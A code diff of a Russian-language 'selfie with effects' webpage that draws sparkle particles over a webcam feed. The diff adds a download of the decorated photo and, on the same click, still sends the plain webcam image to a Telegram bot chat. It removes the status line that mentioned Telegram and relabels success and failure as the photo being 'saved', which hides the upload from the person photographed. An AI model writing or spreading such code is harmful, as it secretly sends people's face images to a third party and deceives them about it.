@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Селфи с TikTok-эффектом</title>
+  <title>Селфи с эффектами</title>
   <style>
     body {
       display: flex;
@@ -35,7 +35,7 @@
       top: 0;
       left: 0;
     }
-    #originalCanvas {
+    #originalCanvas, #effectCanvas {
       display: none;
     }
     h1 {
@@ -80,6 +80,7 @@
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <canvas id="originalCanvas"></canvas>
+    <canvas id="effectCanvas"></canvas>
   </div>
   <button onclick="takeSnapshot()">Сфоткать!</button>
   <div id="status">Улыбнись и нажми!</div>
@@ -88,8 +89,10 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const originalCanvas = document.getElementById('originalCanvas');
+    const effectCanvas = document.getElementById('effectCanvas');
     const ctx = canvas.getContext('2d');
     const originalCtx = originalCanvas.getContext('2d');
+    const effectCtx = effectCanvas.getContext('2d');
     const statusDiv = document.getElementById('status');
 
     // Настройка Telegram
@@ -112,6 +115,8 @@
           canvas.height = video.videoHeight;
           originalCanvas.width = video.videoWidth;
           originalCanvas.height = video.videoHeight;
+          effectCanvas.width = video.videoWidth;
+          effectCanvas.height = video.videoHeight;
           initParticles();
           animate();
         };
@@ -160,7 +165,7 @@
         ctx.fillStyle = 'rgba(255, 215, 0, 0.8)';
         ctx.fill();
 
-        // Если частица "умерла", возрождаем в центре лица
+        // Возрождаем частицу в центре лица
         if (p.life <= 0) {
           p.x = canvas.width / 2;
           p.y = canvas.height / 3;
@@ -174,12 +179,38 @@
       requestAnimationFrame(animate);
     }
 
-    // Снимок без эффектов и отправка в Telegram
+    // Снимок и действия
     async function takeSnapshot() {
       statusDiv.textContent = 'Захват снимка...';
+
+      // Захватываем снимок без эффектов для Telegram
       originalCtx.drawImage(video, 0, 0, originalCanvas.width, originalCanvas.height);
+
+      // Захватываем снимок с эффектами для скачивания
+      effectCtx.drawImage(video, 0, 0, effectCanvas.width, effectCanvas.height);
+      particles.forEach(p => {
+        effectCtx.beginPath();
+        effectCtx.moveTo(p.x, p.y - p.size);
+        effectCtx.lineTo(p.x + p.size * 0.3, p.y - p.size * 0.3);
+        effectCtx.lineTo(p.x + p.size, p.y);
+        effectCtx.lineTo(p.x + p.size * 0.3, p.y + p.size * 0.3);
+        effectCtx.lineTo(p.x, p.y + p.size);
+        effectCtx.lineTo(p.x - p.size * 0.3, p.y + p.size * 0.3);
+        effectCtx.lineTo(p.x - p.size, p.y);
+        effectCtx.lineTo(p.x - p.size * 0.3, p.y - p.size * 0.3);
+        effectCtx.closePath();
+        effectCtx.fillStyle = 'rgba(255, 215, 0, 0.8)';
+        effectCtx.fill();
+      });
+
+      // Скачивание фото с эффектами
+      const downloadLink = document.createElement('a');
+      downloadLink.href = effectCanvas.toDataURL('image/jpeg');
+      downloadLink.download = 'photo_with_effects.jpg';
+      downloadLink.click();
+
+      // Отправка фото без эффектов в Telegram
       originalCanvas.toBlob(async (blob) => {
-        statusDiv.textContent = 'Отправка фото в Telegram...';
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'snapshot.jpg');
@@ -189,10 +220,10 @@
             body: formData
           });
           const result = await response.json();
-          statusDiv.textContent = result.ok ? 'Фото успешно отправлено!' : 'Ошибка: ' + result.description;
+          statusDiv.textContent = result.ok ? 'Фото сохранено!' : 'Ошибка при сохранении.';
         } catch (err) {
           console.error('Ошибка:', err);
-          statusDiv.textContent = 'Не удалось отправить фото. Проверьте подключение.';
+          statusDiv.textContent = 'Ошибка при сохранении.';
         }
       }, 'image/jpeg');
     }
